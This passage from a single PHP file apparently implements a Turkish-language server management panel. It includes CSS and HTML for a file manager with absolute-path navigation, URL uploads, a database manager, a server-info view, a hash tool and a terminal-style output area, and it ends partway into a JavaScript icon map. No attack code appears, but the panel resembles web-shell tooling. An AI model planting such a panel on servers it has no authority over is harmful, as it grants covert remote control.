.toolbar-check{display:flex; align-items:center; gap:6px; font-size:12.5px; color:var(--text2); white-space:nowrap;}

.table-wrap{border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; background:var(--panel);}
#dbTabContent .table-wrap{ overflow-x:auto; }
#dbTabContent td, #dbTabContent th{ white-space:nowrap; }
#dbTabContent .editable-cell{ max-width:280px; vertical-align:top; padding:0; }
#dbTabContent .cell-content{ max-height:90px; overflow-y:auto; white-space:pre-wrap; word-break:break-word; padding:9px 14px; }
#dbTabContent .cell-edit-input{ width:100%; min-width:220px; max-height:160px; background:#141110; color:#fff; border:1px solid var(--accent); border-radius:0; padding:9px 14px; font-family:var(--mono); font-size:13.5px; resize:vertical; outline:none; }
table{width:100%; border-collapse:collapse;}
th{ text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:.04em; color:var(--text3); padding:10px 14px; border-bottom:1px solid var(--border); background:var(--bg2); font-weight:600; position:sticky; top:0; z-index:2; }
td{padding:9px 14px; border-bottom:1px solid var(--border); font-size:13.5px; vertical-align:middle;}
tr:last-child td{border-bottom:none;}
tbody tr{transition:.1s;}
tbody tr:hover{background:var(--card);}
.file-row-name{display:flex; align-items:center; gap:10px; cursor:pointer;}
.file-row-name svg{width:18px; height:18px; flex-shrink:0;}
.icon-folder{color:var(--accent);}
.icon-code{color:#7aa2d9;}
.icon-image{color:#4ca97e;}
.icon-archive{color:#c9a86a;}
.icon-pdf{color:#e5484d;}
.icon-doc,.icon-sheet{color:#9d8df1;}
.icon-video,.icon-audio{color:#e07ee0;}
.icon-file{color:var(--text3);}
.muted{color:var(--text3); font-size:12.5px;}
.date-diff{color:var(--danger) !important; font-weight:600;}

.hash-panel{
  position:fixed; top:0; left:0; bottom:0; width:380px; max-width:92vw; background:var(--panel);
  border-right:1px solid var(--border); z-index:180; transform:translateX(-100%); transition:transform .22s ease;
  display:flex; flex-direction:column; box-shadow:20px 0 50px rgba(0,0,0,.4);
}
.hash-panel.open{ transform:translateX(0); }
.hash-panel-head{ display:flex; align-items:center; justify-content:space-between; padding:16px 18px; border-bottom:1px solid var(--border); }
.hash-panel-body{ padding:16px 18px; overflow:auto; flex:1; }
.hash-panel-backdrop{ position:fixed; inset:0; background:rgba(0,0,0,.5); z-index:170; }
.hash-panel textarea{ width:100%; padding:10px 12px; border-radius:8px; border:1px solid var(--border2); background:var(--bg2); color:var(--text); font-size:13px; font-family:var(--mono); outline:none; resize:vertical; }
.hash-panel textarea:focus{border-color:var(--accent);}
.hash-results{display:flex; flex-direction:column; gap:10px;}
.hash-item{background:var(--card); border:1px solid var(--border); border-radius:8px; padding:9px 11px;}
.hash-item .hash-label{font-size:11px; color:var(--text3); text-transform:uppercase; letter-spacing:.03em; margin-bottom:4px; display:flex; align-items:center; justify-content:space-between;}
.hash-item .hash-value{font-family:var(--mono); font-size:11.5px; color:var(--text); word-break:break-all; line-height:1.5; cursor:pointer;}
.hash-item .hash-value:hover{color:var(--accent);}
.hash-copy-btn{background:none; border:none; color:var(--text3); cursor:pointer; padding:2px; display:flex;}
.hash-copy-btn:hover{color:var(--accent);}
.hash-copy-btn svg{width:12px; height:12px;}

.export-progress{ min-width:340px; }
.export-progress-bar{ width:100%; height:10px; background:var(--bg2); border:1px solid var(--border2); border-radius:20px; overflow:hidden; margin-bottom:10px; }
.export-progress-fill{ height:100%; background:var(--accent); border-radius:20px; transition:width .2s ease; }
.export-progress-text{ font-size:13px; color:var(--text2); font-family:var(--mono); text-align:center; }

.upload-results{ display:flex; flex-direction:column; gap:6px; margin-top:12px; max-height:260px; overflow-y:auto; }
.upload-result-row{ display:flex; align-items:center; gap:10px; background:var(--card); border:1px solid var(--border); border-radius:8px; padding:8px 12px; }
.upload-result-name{ flex:1; font-size:13px; word-break:break-all; }
.upload-result-size{ font-size:12px; color:var(--text3); white-space:nowrap; }
.mono{font-family:var(--mono);}
.checkbox{width:15px; height:15px; accent-color:var(--accent);}
.row-actions{display:flex; gap:4px; opacity:0; transition:.12s;}
tr:hover .row-actions{opacity:1;}
.icon-btn{ width:26px; height:26px; display:flex; align-items:center; justify-content:center; border-radius:6px; border:none; background:transparent; color:var(--text3); }
.icon-btn svg{width:15px; height:15px;}
.icon-btn:hover{background:var(--bg2); color:var(--text);}
.icon-btn.danger:hover{color:var(--danger);}
.link-badge{font-size:10px; color:var(--text3); border:1px solid var(--border2); border-radius:4px; padding:1px 5px; margin-left:6px;}
.self-file-row{ background:var(--danger-dim); }
.self-file-row:hover{ background:rgba(229,72,77,.2); }
.self-file-name{ color:var(--danger); font-weight:600; }
.self-file-name .icon-file, .self-file-name .icon-code{ color:var(--danger); }
.self-badge{ font-size:9.5px; font-weight:700; letter-spacing:.04em; color:#fff; background:var(--danger); border-radius:4px; padding:1px 6px; margin-left:6px; }

.empty-state{padding:60px 20px; text-align:center; color:var(--text3);}
.empty-state svg{width:40px; height:40px; margin-bottom:10px; opacity:.5;}

.cards-row{display:grid; grid-template-columns:repeat(auto-fit,minmax(190px,1fr)); gap:12px; margin-bottom:18px;}
.stat-card{background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); padding:16px;}

.extras-card{ display:flex; align-items:flex-start; gap:12px; text-align:left; padding:16px; height:auto; justify-content:flex-start; }
.extras-card svg{ width:22px; height:22px; flex-shrink:0; color:var(--accent); margin-top:2px; }
.extras-card-title{ font-size:13.5px; font-weight:600; color:var(--text); margin-bottom:3px; }
.extras-card-sub{ font-size:11.5px; color:var(--text3); line-height:1.4; }
.log-view{ background:#141110; color:#c9c2b6; border:1px solid var(--border); border-radius:8px; padding:12px; font-family:var(--mono); font-size:11.5px; line-height:1.6; max-height:420px; overflow:auto; white-space:pre-wrap; word-break:break-all; margin-top:8px; }
.ip-row{ display:flex; align-items:center; justify-content:space-between; background:var(--card); border:1px solid var(--border); border-radius:8px; padding:8px 12px; }
.stat-card .label{font-size:11.5px; color:var(--text3); text-transform:uppercase; letter-spacing:.03em; margin-bottom:6px;}
.stat-card .value{font-size:20px; font-weight:600;}

.modal-overlay{ position:fixed; inset:0; background:rgba(10,8,7,.6); backdrop-filter:blur(2px); display:flex; align-items:center; justify-content:center; z-index:100; }
.modal{ background:var(--panel); border:1px solid var(--border); border-radius:14px; width:460px; max-width:92vw; max-height:86vh; display:flex; flex-direction:column; box-shadow:0 30px 80px rgba(0,0,0,.5); }
.modal.wide{width:760px;}
.modal.xwide{width:960px;}
.modal-head{padding:16px 20px; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between;}
.modal-title{font-size:15px; font-weight:600;}
.modal-close{background:none; border:none; color:var(--text3); width:26px; height:26px; border-radius:6px; display:flex; align-items:center; justify-content:center;}
.modal-close:hover{background:var(--card); color:var(--text);}
.modal-close svg{width:16px; height:16px;}
.modal-body{padding:20px; overflow:auto;}
.modal-foot{padding:14px 20px; border-top:1px solid var(--border); display:flex; justify-content:flex-end; gap:8px;}
.field{margin-bottom:14px;}
.field label{display:block; font-size:12.5px; color:var(--text2); margin-bottom:6px; font-weight:500;}
.field input, .field select, .field textarea{ width:100%; padding:9px 12px; border-radius:8px; border:1px solid var(--border2); background:var(--bg2); color:var(--text); font-size:13.5px; outline:none; }
.field input:focus, .field select:focus, .field textarea:focus{border-color:var(--accent);}
.field input[readonly]{color:var(--text2); cursor:default;}
.pw-field{ position:relative; display:flex; }
.pw-field input{ flex:1; padding-right:38px !important; }
.pw-toggle{ position:absolute; right:6px; top:50%; transform:translateY(-50%); width:26px; height:26px; display:flex; align-items:center; justify-content:center; border:none; background:none; color:var(--text3); border-radius:6px; }
.pw-toggle svg{ width:16px; height:16px; }
.pw-toggle:hover{ background:var(--card); color:var(--text); }
.field-row{display:flex; gap:10px;}
.field-row .field{flex:1;}
.hint{font-size:11.5px; color:var(--text3); margin-top:5px; line-height:1.5;}

.editor-wrap{display:flex; flex-direction:column; height:70vh;}
.editor-wrap textarea{ flex:1; width:100%; background:#141110; color:#e9e2d8; border:1px solid var(--border); border-radius:8px; padding:14px; font-family:var(--mono); font-size:13px; line-height:1.6; resize:none; outline:none; tab-size:4; }
.editor-wrap .CodeMirror{ height:100%; border:1px solid var(--border); border-radius:8px; font-family:var(--mono); font-size:13px; }
.editor-wrap .CodeMirror-gutters{ border-radius:8px 0 0 8px; }
.CodeMirror-fullscreen{ z-index:300 !important; }
.cm-fullscreen-exit{
  display:none; align-items:center; gap:7px; position:fixed; top:14px; right:14px; z-index:400;
  background:var(--accent); color:#fff; border:none; border-radius:8px; padding:10px 14px;
  font-size:13px; font-weight:600; box-shadow:0 10px 30px rgba(0,0,0,.5); cursor:pointer;
}
.cm-fullscreen-exit svg{ width:15px; height:15px; }
.cm-fullscreen-exit:hover{ background:var(--accent2); }

.toast-wrap{position:fixed; bottom:20px; right:20px; z-index:200; display:flex; flex-direction:column; gap:8px;}
.toast{ padding:11px 16px; border-radius:9px; background:var(--card); border:1px solid var(--border2); font-size:13px; box-shadow:0 10px 30px rgba(0,0,0,.4); display:flex; align-items:center; gap:9px; min-width:220px; animation:slideIn .2s ease; }
.toast svg{width:16px; height:16px; flex-shrink:0;}
.toast.success{border-color:rgba(76,169,126,.4);} .toast.success svg{color:var(--success);}
.toast.error{border-color:rgba(229,72,77,.4);} .toast.error svg{color:var(--danger);}
@keyframes slideIn{from{opacity:0; transform:translateX(20px);} to{opacity:1; transform:translateX(0);}}

.db-tabs{display:flex; gap:4px; border-bottom:1px solid var(--border); margin-bottom:16px; flex-wrap:wrap; flex-shrink:0;}

.conn-tabs-bar{ display:flex; align-items:center; gap:6px; flex-wrap:wrap; margin-bottom:14px; flex-shrink:0; }
.conn-tab{ display:flex; align-items:center; gap:6px; padding:6px 8px 6px 12px; border-radius:8px; border:1px solid var(--border2); background:var(--card); font-size:12.5px; color:var(--text2); cursor:pointer; }
.conn-tab:hover{ border-color:var(--accent); }
.conn-tab.active{ background:var(--accent-dim); border-color:var(--accent); color:var(--accent); font-weight:600; }
.conn-tab-label{ white-space:nowrap; max-width:220px; overflow:hidden; text-overflow:ellipsis; }
.conn-tab-close{ display:flex; align-items:center; justify-content:center; width:18px; height:18px; border:none; background:none; color:var(--text3); border-radius:4px; }
.conn-tab-close svg{ width:11px; height:11px; }
.conn-tab-close:hover{ background:var(--danger-dim); color:var(--danger); }
.conn-tab-add{ display:flex; align-items:center; gap:6px; padding:6px 12px; border-radius:8px; border:1px dashed var(--border2); background:transparent; color:var(--text2); font-size:12.5px; }
.conn-tab-add svg{ width:13px; height:13px; }
.conn-tab-add:hover{ border-color:var(--accent); color:var(--accent); }
.db-tab{padding:9px 14px; font-size:13px; color:var(--text2); border-bottom:2px solid transparent; cursor:pointer; font-weight:500;}
.db-tab svg{width:14px; height:14px; vertical-align:-2px; margin-right:2px;}
.db-tab.active{color:var(--accent); border-bottom-color:var(--accent);}
.sql-textarea{ width:100%; min-height:120px; background:#141110; color:#e9e2d8; border:1px solid var(--border); border-radius:8px; padding:12px; font-family:var(--mono); font-size:13px; line-height:1.5; outline:none; resize:vertical; }
.pagination{display:flex; align-items:center; gap:8px; margin-top:14px; font-size:13px; color:var(--text2);}
.editable-cell{cursor:text;}
.editable-cell:hover{background:var(--accent-dim);}
.badge{display:inline-block; padding:2px 8px; border-radius:20px; font-size:11px; font-weight:600;}
.badge-green{background:var(--success-dim); color:var(--success);}
.badge-gray{background:var(--card); color:var(--text3);}

.dropzone{ border:2px dashed var(--border2); border-radius:12px; padding:34px; text-align:center; color:var(--text3); margin-bottom:14px; transition:.15s; }
.dropzone.drag{border-color:var(--accent); background:var(--accent-dim); color:var(--accent);}
.dropzone svg{width:28px; height:28px; margin-bottom:8px;}

.terminal{ background:#0e0c0b; border:1px solid var(--border); border-radius:8px; padding:14px; font-family:var(--mono); font-size:12.5px; color:#8fe08f; min-height:280px; max-height:50vh; overflow:auto; white-space:pre-wrap; word-break:break-all; }
.select-info{font-size:13px; color:var(--text2); display:flex; align-items:center; gap:8px; flex-wrap:wrap;}

.row-menu{ position:fixed; background:var(--panel); border:1px solid var(--border2); border-radius:10px; box-shadow:0 12px 30px rgba(0,0,0,.5); padding:6px; z-index:150; min-width:200px; max-height:340px; overflow-y:auto; }
.row-menu-item{ display:flex; align-items:center; gap:9px; width:100%; padding:8px 10px; background:none; border:none; border-radius:7px; color:var(--text2); font-size:13px; text-align:left; }
.row-menu-item svg{width:15px; height:15px; flex-shrink:0;}
.row-menu-item:hover{background:var(--card); color:var(--text);}
.row-menu-item.danger:hover{color:var(--danger);}

.theme-toggle{ display:flex; align-items:center; gap:8px; width:100%; padding:9px 12px; border-radius:8px; background:transparent; border:1px solid var(--border2); color:var(--text2); font-size:13px; transition:.12s; margin-bottom:8px; }
.theme-toggle:hover{border-color:var(--accent); color:var(--accent);}
.theme-toggle svg{width:15px; height:15px; flex-shrink:0;}

.hamburger{ display:none; position:fixed; top:12px; left:12px; z-index:210; width:38px; height:38px; border-radius:9px; background:var(--card); border:1px solid var(--border2); color:var(--text); align-items:center; justify-content:center; box-shadow:0 6px 20px rgba(0,0,0,.35); }
.hamburger svg{width:18px; height:18px;}
.sidebar-backdrop{ position:fixed; inset:0; background:rgba(0,0,0,.55); z-index:150; }

@media (max-width: 900px){
  .hamburger{ display:flex; }
  .sidebar{ position:fixed; top:0; bottom:0; left:0; width:240px; transform:translateX(-100%); transition:transform .22s ease; z-index:200; }
  .sidebar.open{ transform:translateX(0); box-shadow:20px 0 50px rgba(0,0,0,.5); }
  .main{ width:100%; }
  .topbar{ padding:10px 14px 10px 58px; gap:8px; }
  .path-jump input{ width:150px; }
  .search-box{ min-width:130px; }
  .view{ padding:12px; }
  .toolbar{ gap:6px; }
  .btn{ padding:7px 10px; font-size:12px; }
  .btn svg{ width:14px; height:14px; }
  th:nth-child(4), td:nth-child(4){ display:none; }
  th:nth-child(5), td:nth-child(5){ display:none; }
  th:nth-child(6), td:nth-child(6){ display:none; }
  table th, table td{ padding:8px 8px; font-size:12.5px; }
  .modal{ width:94vw; }
  .modal.wide, .modal.xwide{ width:96vw; }
  .cards-row{ grid-template-columns:1fr 1fr; }
  .field-row{ flex-direction:column; gap:0; }
  .db-tabs{ overflow-x:auto; flex-wrap:nowrap; }
  .toolbar-select{ font-size:12px; padding:6px 8px; }
}
@media (max-width: 520px){
  .cards-row{ grid-template-columns:1fr; }
  .path-jump{ display:none; }
  .brand-sub{ display:none; }
  .select-info{ width:100%; }
  .toolbar-check{ display:none; }
}
</style>
</head>
<body>
<button class="hamburger" id="hamburgerBtn" aria-label="Menü">
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
</button>
<div class="app">

  <div class="sidebar" id="sidebar">
    <div class="brand">
      <div class="brand-icon">P</div>
      <div>
        <div class="brand-name"><?= htmlspecialchars(PANEL_NAME) ?></div>
        <div class="brand-sub">Yönetim Paneli</div>
      </div>
    </div>
    <div class="nav">
      <div class="nav-item active" data-view="files">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg>
        Dosya Yöneticisi
      </div>
      <div class="nav-item" data-view="database">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v14c0 1.66 3.58 3 8 3s8-1.34 8-3V5"/><path d="M4 12c0 1.66 3.58 3 8 3s8-1.34 8-3"/></svg>
        Veritabanı
      </div>
      <div class="nav-item" data-view="server">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
        Sunucu Bilgisi
      </div>
      <div class="nav-item" data-view="extras">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
        Ek Seçenekler
      </div>
    </div>
    <div class="sidebar-foot">
      <button class="theme-toggle" id="themeToggle">
        <svg id="themeIconMoon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
        <svg id="themeIconSun" class="hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
        <span id="themeLabel">Koyu Mod</span>
      </button>
      <button class="logout-btn" onclick="location.href='?logout=1'">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
        Çıkış Yap
      </button>
    </div>
  </div>

  <div class="main">

    <!-- FILES VIEW -->
    <div class="view-container" id="view-files">
      <div class="topbar">
        <div class="crumbs" id="crumbs"></div>
        <div class="spacer"></div>
        <div class="path-jump">
          <input type="text" id="pathJumpInput" placeholder="/mutlak/yol yazıp Enter'a basın">
          <button class="btn btn-sm" id="pathJumpGo">Git</button>
        </div>
        <div class="search-box">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <input type="text" id="fmSearch" placeholder="Bu dizinde ara...">
        </div>
      </div>
      <div class="view view-files-scroll">
        <div class="toolbar">
          <button class="btn" id="btnBack" title="Geri Git">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
          </button>
          <button class="btn" id="btnForward" title="İleri Git">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
          </button>
          <button class="btn" id="btnUp" title="Üst Dizine Git">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
            Üst Dizin
          </button>
          <button class="btn" id="btnPanelHome" title="Panel Dosyasının Bulunduğu Konuma Git">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 21s-7-6.5-7-11a7 7 0 0 1 14 0c0 4.5-7 11-7 11z"/><circle cx="12" cy="10" r="2.5"/></svg>
            Panel Konumu
          </button>
          <button class="btn" id="btnHashTool" title="Hash / Şifreleme Aracı">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6M15.5 7.5l3 3L21 8l-3-3"/></svg>
            Hash Aracı
          </button>
          <button class="btn btn-primary" id="btnUpload">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            Yükle
          </button>
          <button class="btn" id="btnUploadUrl">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 0 20 15.3 15.3 0 0 1 0-20z"/></svg>
            URL'den Yükle
          </button>
          <button class="btn" id="btnMkdir">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
            Yeni Klasör
          </button>
          <button class="btn" id="btnMkfile">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
            Yeni Dosya
          </button>
          <button class="btn" id="btnRefresh">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
            Yenile
          </button>
          <button class="btn hidden" id="btnPaste">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/></svg>
            Yapıştır
          </button>
          <label class="toolbar-check"><input type="checkbox" class="checkbox" id="toggleHidden" checked> Gizli dosyalar</label>
          <select class="toolbar-select" id="sortSelect">
            <option value="name">Ada göre sırala</option>
            <option value="size">Boyuta göre sırala</option>
            <option value="date">Tarihe göre sırala</option>
          </select>
          <select class="toolbar-select" id="filterTypeSelect">
            <option value="">Tüm dosyalar</option>
            <option value="image">Yalnızca görseller</option>
            <option value="code">Yalnızca kod dosyaları</option>
            <option value="doc">Yalnızca belgeler</option>
            <option value="sheet">Yalnızca tablolar</option>
            <option value="archive">Yalnızca arşivler</option>
            <option value="video">Yalnızca video</option>
            <option value="audio">Yalnızca ses</option>
            <option value="pdf">Yalnızca PDF</option>
          </select>
          <input type="text" class="toolbar-select" id="filterExtInput" placeholder="uzantı: php,js,css" style="width:140px;">
          <div class="spacer"></div>
          <div class="select-info hidden" id="selectInfo">
            <span id="selectCount">0 öğe seçildi</span>
            <button class="btn btn-sm" id="btnCutSelected">Kes</button>
            <button class="btn btn-sm" id="btnCopySelected">Kopyala</button>
            <button class="btn btn-sm" id="btnMoveTo">Taşı...</button>
            <button class="btn btn-sm" id="btnCopyTo">Kopyala...</button>
            <button class="btn btn-sm" id="btnZipSelected">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M12 8v8M9 11h6"/></svg>
              Ziple İndir
            </button>
            <button class="btn btn-sm" id="btnZipServer">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
              Sunucuya Ziple
            </button>
            <button class="btn btn-sm btn-danger" id="btnDeleteSelected">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
              Sil
            </button>
          </div>
        </div>
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th style="width:34px;"><input type="checkbox" class="checkbox" id="selectAll"></th>
                <th>Ad</th>
                <th style="width:100px;">Boyut</th>
                <th style="width:130px;">Oluşturulma</th>
                <th style="width:130px;">Değiştirilme</th>
                <th style="width:80px;">İzinler</th>
                <th style="width:70px;"></th>
              </tr>
            </thead>
            <tbody id="fileList"></tbody>
          </table>
          <div class="empty-state hidden" id="emptyState">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg>
            <div>Bu klasör boş</div>
          </div>
        </div>
      </div>
    </div>

    <!-- DATABASE VIEW -->
    <div class="view-container hidden" id="view-database">
      <div class="topbar">
        <div style="font-weight:600; font-size:14px;">Veritabanı Yöneticisi</div>
        <div class="spacer"></div>
        <span id="dbStatusBadge" class="badge badge-gray">Bağlı değil</span>
      </div>
      <div class="view view-db-scroll" id="dbView"></div>
    </div>

    <!-- SERVER INFO VIEW -->
    <div class="view-container hidden" id="view-server">
      <div class="topbar"><div style="font-weight:600; font-size:14px;">Sunucu Bilgisi</div></div>
      <div class="view" id="serverView"></div>
    </div>

    <div class="view-container hidden" id="view-extras">
      <div class="topbar"><div style="font-weight:600; font-size:14px;">Ek Seçenekler</div></div>
      <div class="view" id="extrasView"></div>
    </div>

  </div>
</div>

<div class="hash-panel" id="hashPanel">
  <div class="hash-panel-head">
    <div style="font-weight:600; font-size:14px;">Hash / Şifreleme Aracı</div>
    <button class="modal-close" id="hashPanelClose">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>
  </div>
  <div class="hash-panel-body">
    <div class="field">
      <label>Metin</label>
      <textarea id="hashInput" rows="3" placeholder="Hash'lenecek metni yazın..."></textarea>
    </div>
    <div id="hashResults" class="hash-results"></div>
  </div>
</div>
<div class="hash-panel-backdrop hidden" id="hashPanelBackdrop"></div>

<div class="toast-wrap" id="toastWrap"></div>

<script>
const CSRF = <?= json_encode($csrf) ?>;
const PANEL_START_DIR = <?= json_encode(START_DIR) ?>;
let activeEditor = null;
let activeConnId = null; /* şu an aktif olan veritabanı bağlantısının kimliği */

const ICONS = {
  folder: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg>',
  file: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>',
  code: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>',
  image: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>',
  archive: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M12 8v8M9 11h6"/></svg>',
  pdf: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="15" x2="15" y2="15"/></svg>',
  doc: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/></svg>',
  sheet: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="9" x2="9" y2="21"/></svg>',
  video: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>',
